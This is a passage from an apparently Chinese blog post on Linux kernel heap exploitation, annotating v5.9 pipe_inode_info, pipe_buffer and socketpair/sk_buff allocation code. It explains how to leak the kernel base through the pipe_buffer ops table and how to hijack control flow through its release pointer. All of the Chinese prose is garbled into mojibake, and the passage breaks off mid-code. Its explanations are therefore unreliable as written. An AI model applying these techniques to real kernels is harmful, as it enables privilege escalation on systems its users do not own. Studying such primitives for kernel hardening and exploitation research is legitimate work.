free_uid(user);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç›¸å…³çš„<code>pipe_inode_info</code>ç»“æ„å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">mutex</span>;</span></span><br><span class="line">	<span class="keyword">wait_queue_head_t</span> rd_wait, wr_wait;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> head;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> tail;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_usage;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> ring_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="keyword">bool</span> note_loss;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> nr_accounted;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> readers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> writers;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> files;<span class="comment">//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> r_counter;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> w_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">tmp_page</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_readers</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync_writers</span>;</span></span><br><span class="line">    <span class="comment">//pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">bufs</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">watch_queue</span> *<span class="title">watch_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡é‡Šæ”¾-2"   >
          <a href="#â‘¡é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-2" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <p>ç›´æ¥ä½¿ç”¨<code>close</code>å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚</p>
<p>å‡½æ•°é“¾è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pipe_release()-&gt;put_pipe_info()-&gt;free_pipe_info()</span><br></pre></td></tr></table></div></figure>

<p>éœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨<code>put_pipe_info</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">put_pipe_info</span><span class="params">(struct inode *inode, struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> kill = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	spin_lock(&amp;inode-&gt;i_lock);</span><br><span class="line">	<span class="keyword">if</span> (!--pipe-&gt;files) &#123;</span><br><span class="line">		inode-&gt;i_pipe = <span class="literal">NULL</span>;</span><br><span class="line">		kill = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°</span></span><br><span class="line">	<span class="keyword">if</span> (kill)</span><br><span class="line">		free_pipe_info(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>åªæœ‰<code>pipe_inode_info</code>è¿™ä¸ªç®¡ç†ç»“æ„ä¸­çš„<code>files</code>æˆå‘˜ä¸º0ï¼Œæ‰ä¼šè¿›è¡Œé‡Šæ”¾ï¼Œä¹Ÿå°±æ˜¯ç®¡é“ä¸¤ç«¯éƒ½å…³é—­æ‰æ‰è¡Œã€‚</p>
<p>ç›¸å…³é‡Šæ”¾å‡½æ•°<code>free_pipe_info</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_pipe_info</span><span class="params">(struct pipe_inode_info *pipe)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="comment">//å’Œç®¡é“ç›¸å…³çš„é‡Šæ”¾æœ‰å…³ï¼Œä¹Ÿæ˜¯ç›¸å…³çš„æ¼æ´ç‚¹</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line">		<span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">			pipe_buf_release(pipe, buf);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_bufferæ•°ç»„,kmalloc-1024</span></span><br><span class="line">	kfree(pipe-&gt;bufs);</span><br><span class="line">    <span class="comment">//é‡Šæ”¾pipe_inode_infoç®¡ç†ç»“æ„,kmalloc-192</span></span><br><span class="line">	kfree(pipe);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h3 id="3-åˆ©ç”¨-1"   >
          <a href="#3-åˆ©ç”¨-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨-1" class="headerlink" title="(3)åˆ©ç”¨"></a>(3)åˆ©ç”¨</h3>
      
        <h4 id="â‘ ä¿¡æ¯æ³„éœ²"   >
          <a href="#â‘ ä¿¡æ¯æ³„éœ²" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ ä¿¡æ¯æ³„éœ²" class="headerlink" title="â‘ ä¿¡æ¯æ³„éœ²"></a>â‘ ä¿¡æ¯æ³„éœ²</h4>
      <p><code>pipe_buffer</code>ç»“æ„çš„<code>buf</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset, len;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>å…¶ä¸­çš„<code>ops</code>æˆå‘˜ï¼Œå³<code>struct pipe_buf_operations</code>ç»“æ„çš„<code>pipe-&gt;bufs[i]-&gt;ops</code>ï¼Œå…¶ä¸­ä¿å­˜ç€å…¨å±€çš„å‡½æ•°è¡¨ï¼Œå¯é€šè¿‡è¿™ä¸ªæ¥æ³„éœ²å†…æ ¸åŸºåœ°å€ï¼Œç›¸å…³ç»“æ„å¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /include/linux/pipe_fs_i.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">int</span> (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> (*release)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> (*get)(struct pipe_inode_info *, struct pipe_buffer *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡åŠ«æŒç¨‹åºæµ"   >
          <a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡åŠ«æŒç¨‹åºæµ" class="headerlink" title="â‘¡åŠ«æŒç¨‹åºæµ"></a>â‘¡åŠ«æŒç¨‹åºæµ</h4>
      <p>å½“å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œè°ƒç”¨åˆ°<code>free_pipe_info</code>å‡½æ•°ï¼Œåœ¨æ¸…ç†<code>pipe_buffer</code>æ—¶è¿›å…¥å¦‚ä¸‹åˆ¤æ–­ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">    pipe_buf_release(pipe, buf);</span><br></pre></td></tr></table></div></figure>

<p>å½“ç®¡é“ä¸­å­˜åœ¨æœªè¢«è¯»å–çš„æ•°æ®æ—¶ï¼Œå³æˆ‘ä»¬éœ€è¦è°ƒç”¨<code>write</code>å‘ç®¡é“çš„å†™å…¥ç«¯å†™å…¥æ•°æ®</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_write</span><span class="params">(struct kiocb *iocb, struct iov_iter *from)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">    buf = &amp;pipe-&gt;bufs[head &amp; mask];</span><br><span class="line">    buf-&gt;page = page;</span><br><span class="line">    buf-&gt;ops = &amp;anon_pipe_buf_ops;</span><br><span class="line">    buf-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åä¸è¦å°†æ•°æ®å…¨éƒ¨è¯»å–å‡ºæ¥ï¼Œå¦‚æœå…¨éƒ¨è¯»å–å‡ºæ¥çš„è¯ï¼Œé‚£ä¹ˆåœ¨<code>read</code>å¯¹åº”çš„<code>pipe_read</code>å‡½æ•°ä¸­å°±ä¼šå¦‚ä¸‹æƒ…å†µ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9  /fs/pipe.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span></span><br><span class="line"><span class="function">    <span class="title">pipe_read</span><span class="params">(struct kiocb *iocb, struct iov_iter *to)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[(head - <span class="number">1</span>) &amp; mask];</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">    <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">        pipe_buf_release(pipe, buf);</span><br><span class="line">        <span class="comment">//....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//....</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ä»è€Œè°ƒç”¨<code>pipe_buf_release</code>å°†<code>buf-&gt;ops</code>æ¸…ç©ºã€‚</p>
<p>ğŸ”ºæ³¨ï¼šï¼ˆå…¶å®è¿™é‡Œæ—¢ç„¶è°ƒç”¨åˆ°äº†<code>pipe_buf_release</code>å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥é€šè¿‡<code>read</code>å°†ç®¡é“<code>pipe</code>ä¸­çš„æ‰€æœ‰æ•°æ®è¯»å–å‡ºæ¥ï¼Œå…¶å®ä¹Ÿèƒ½æ‰§è¡Œè¯¥<code>release</code>å‡½æ•°æŒ‡é’ˆçš„ï¼Œä»è€ŒåŠ«æŒç¨‹åºæ§åˆ¶æµçš„ã€‚ï¼‰</p>
<p>é‚£ä¹ˆæ¥ç€ä¸Šè¿°çš„æƒ…å†µï¼Œé‚£ä¹ˆåœ¨å…³é—­ä¸¤ç«¯æ—¶<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å°±ä¼šå­˜åœ¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png" alt="image-20220509192251738"></p>
<p>è€Œå½“<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨å­˜åœ¨æ—¶ï¼Œå…³é—­ç®¡é“ç¬¦ä¸¤ç«¯è¿›å…¥ä¸Šè¿°åˆ¤æ–­ä¹‹åï¼Œå°±ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„<code>pipe_buf_release</code>å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨åˆ°è¿™ä¸ª<code>buf-&gt;ops</code>å‡½æ•°è¡¨ç»“æ„ä¸‹å¯¹åº”çš„<code>relase</code>å‡½æ•°æŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆåœ¨ä¸Šè¿°çš„<code>pipe_buf_operations</code>ç»“æ„ä¸­æœ‰æåˆ°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png" alt="image-20220509193945468"></p>
<p>é‚£ä¹ˆå¦‚æœåŠ«æŒäº†<code>buf-&gt;ops</code>è¿™ä¸ªå‡½æ•°è¡¨ï¼Œå°±èƒ½æ§åˆ¶åˆ°<code>release</code>å‡½æ•°æŒ‡é’ˆï¼Œä»è€ŒåŠ«æŒæ§åˆ¶æµç¨‹ã€‚</p>
<p>ä¸è¿‡<code>pipe</code>ç®¡é“å…·ä½“çš„ä¿å­˜çš„æ•°æ®æ”¾åœ¨å“ªé‡Œï¼Œè¿˜æ˜¯ä¸å¤ªæ¸…æ¥šï¼Œå¬<code>bsauce</code>è¯´æ˜¯åœ¨<code>struct pipe_buffer</code>ç»“æ„ä¸‹<code>buf</code>çš„<code>page</code>é‡Œé¢ï¼Œä½†æ˜¯æ²¡æœ‰æ‰¾åˆ°ï¼Œåç»­è¿˜éœ€è¦ç»§ç»­çœ‹çœ‹ï¼Œå…ˆmarkä¸€ä¸‹ã€‚è¿™æ ·ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥ï¼Œæ¯å†™å…¥ä¸€æ¡ä¿¡æ¯æ—¶ï¼Œå†…æ ¸çš„<code>kmalloc</code>å¯¹åº”çš„å †å†…å­˜åŸºæœ¬æ˜¯ä¸å‘ç”Ÿå˜åŒ–çš„ï¼Œä¸ä¸‹é¢æåˆ°çš„<code>sk_buff</code>æœ‰ç‚¹ä¸åŒã€‚</p>

        <h2 id="3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š"   >
          <a href="#3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-sk-buffâ€”kmalloc-512åŠä»¥ä¸Š" class="headerlink" title="3.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š"></a>3.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š</h2>
      <p>å‚è€ƒï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_40039738/article/details/81095013" >(31æ¡æ¶ˆæ¯) socketpairçš„ç”¨æ³•å’Œç†è§£_é›ªè¿‡æ— ç—•_çš„åšå®¢-CSDNåšå®¢_socketpair</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å’Œè¯¥ç»“æ„ä½“ç›¸å…³çš„æ˜¯ä¸€ä¸ª<code>socketpair</code>ç³»ç»Ÿè°ƒç”¨è¿™ä¸ªä¹Ÿç®—æ˜¯<code>socket</code>ç½‘ç»œåè®®çš„ä¸€ç§ï¼Œä½†æ˜¯æ˜¯åœ¨æœ¬åœ°è¿›ç¨‹ä¹‹é—´é€šä¿¡çš„ï¼Œè€Œéåœ¨ç½‘ç»œä¹‹é—´çš„é€šä¿¡ã€‚è¯´åˆ°åº•ï¼Œè¿™ä¸ªå…¶å®å’Œ<code>pipe</code>éå¸¸åƒï¼Œä¹Ÿæ˜¯ä¸€ä¸ªè¿›ç¨‹é—´çš„é€šä¿¡æ‰‹æ®µã€‚ä¸è¿‡ç›¸å…³åŒºåˆ†å¦‚ä¸‹ï¼š</p>
<ul>
<li>æ•°æ®ä¼ è¾“æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šå•å·¥ï¼Œå‘é€ç«¯<code>fd[1]</code>å‘é€æ•°æ®ï¼Œæ¥æ”¶ç«¯<code>fd[0]</code>æ¥æ”¶æ•°æ®</li>
<li><code>socketpair</code>ï¼šå…¨åŒå·¥ï¼ŒåŒä¸€æ—¶åˆ»ä¸¤ç«¯å‡å¯å‘é€å’Œæ¥æ”¶æ•°æ®ï¼Œæ— è®ºä¿¡é“ä¸­çš„æ•°æ®æ˜¯å¦è¢«æ¥æ”¶å®Œæ¯•ã€‚</li>
</ul>
</li>
<li>æ¨¡å¼<ul>
<li><code>pipe</code>ï¼šç”±<code>flag</code>æ¥å®šä¹‰ä¸åŒæ¨¡å¼</li>
<li><code>socketpair</code>ï¼šé»˜è®¤é˜»å¡çŠ¶æ€</li>
</ul>
</li>
</ul>
<p>æ­¤å¤–åœ¨ã€ŠLinuxç³»ç»Ÿç¼–ç¨‹æ‰‹å†Œã€‹ä¸€ä¹¦ä¸­æåˆ°ï¼Œ<code>pipe()</code>å‡½æ•°å®é™…ä¸Šè¢«å®ç°æˆäº†ä¸€ä¸ªå¯¹<code>socketpair</code>çš„è°ƒç”¨ã€‚</p>

        <h3 id="1-ä½¿ç”¨æ–¹æ³•-2"   >
          <a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä½¿ç”¨æ–¹æ³•-2" class="headerlink" title="(1)ä½¿ç”¨æ–¹æ³•"></a>(1)ä½¿ç”¨æ–¹æ³•</h3>
      
        <h4 id="â‘ åˆ›å»º-3"   >
          <a href="#â‘ åˆ›å»º-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ›å»º-3" class="headerlink" title="â‘ åˆ›å»º"></a>â‘ åˆ›å»º</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//é»˜è®¤å¿…é¡»</span></span><br><span class="line"><span class="keyword">int</span> socket_fd[<span class="number">2</span>];</span><br><span class="line"><span class="comment">//domainå‚æ•°å¿…é¡»è¢«æŒ‡å®šä¸ºAF_UNIX,ä¸åŒçš„</span></span><br><span class="line"><span class="keyword">int</span> sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, socket_fd);</span><br><span class="line"><span class="keyword">if</span>( sockPair_return &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror( <span class="string">&quot;socketpair()&quot;</span> );</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åå’Œ<code>pipe</code>ç®¡é“ä¸€æ ·ï¼Œä½¿ç”¨<code>write/read</code>å³å¯ï¼Œä¸è¿‡è¿™ä¸ªçš„fdä¸¤ç«¯éƒ½å¯ä»¥å†™å…¥è¯»å–ï¼Œä½†æ˜¯æ¶ˆæ¯ä¼ é€’çš„æ—¶å€™ä¸€ç«¯å†™å…¥æ¶ˆæ¯ï¼Œå°±éœ€è¦ä»å¦ä¸€ç«¯æ‰èƒ½æŠŠæ¶ˆæ¯è¯»å–å‡ºæ¥</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span>* msg = <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;</span><br><span class="line">write(socket_fd[<span class="number">0</span>],msg,<span class="number">0x8</span>);</span><br><span class="line">read(socket_fd[<span class="number">1</span>],buf,<span class="number">0x8</span>);</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é‡Šæ”¾-3"   >
          <a href="#â‘¡é‡Šæ”¾-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é‡Šæ”¾-3" class="headerlink" title="â‘¡é‡Šæ”¾"></a>â‘¡é‡Šæ”¾</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">close(socket_fd[<span class="number">0</span>]);</span><br><span class="line">close(socket_fd[<span class="number">1</span>]);</span><br></pre></td></tr></table></div></figure>

<p>å¯ä»¥çœ‹åˆ°å’Œ<code>pipe</code>æ˜¯å¾ˆç›¸ä¼¼çš„ã€‚</p>

        <h3 id="2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2"   >
          <a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å†…å­˜åˆ†é…ä¸é‡Šæ”¾-2" class="headerlink" title="(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾"></a>(2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</h3>
      <p>åœ¨è°ƒç”¨<code>socketpair</code>è¿™ä¸ªç³»ç»Ÿè°ƒç”¨å·æ—¶ï¼Œå¹¶ä¸ä¼šè¿›è¡Œç›¸å…³çš„å†…å­˜åˆ†é…ï¼Œåªæœ‰åœ¨ä½¿ç”¨<code>write</code>æ¥å†™å…¥æ¶ˆæ¯ï¼Œè¿›è¡Œæ•°æ®ä¼ è¾“æ—¶æ‰ä¼šåˆ†é…ã€‚</p>

        <h4 id="â‘ åˆ†é…-1"   >
          <a href="#â‘ åˆ†é…-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†é…-1" class="headerlink" title="â‘ åˆ†é…"></a>â‘ åˆ†é…</h4>
      <p>åœ¨è°ƒç”¨<code>write</code>è¿›è¡Œæ•°æ®å†™å…¥æ—¶</p>
<p>å‡½æ•°é“¾ï¼š</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">write -&gt; ksys_write() -&gt; vfs_write() -&gt; new_sync_write() -&gt; call_write_iter() -&gt; sock_write_iter() -&gt; sock_sendmsg() -&gt; sock_sendmsg_nosec() -&gt; unix_stream_sendmsg()-&gt;å†…å­˜ç”³è¯·/æ•°æ®å¤åˆ¶</span><br></pre></td></tr></table></div></figure>

<p>åœ¨<code>unix_stream_sendmsg</code>å¼€å§‹åˆ†å‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /net/unix/af_unix.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span 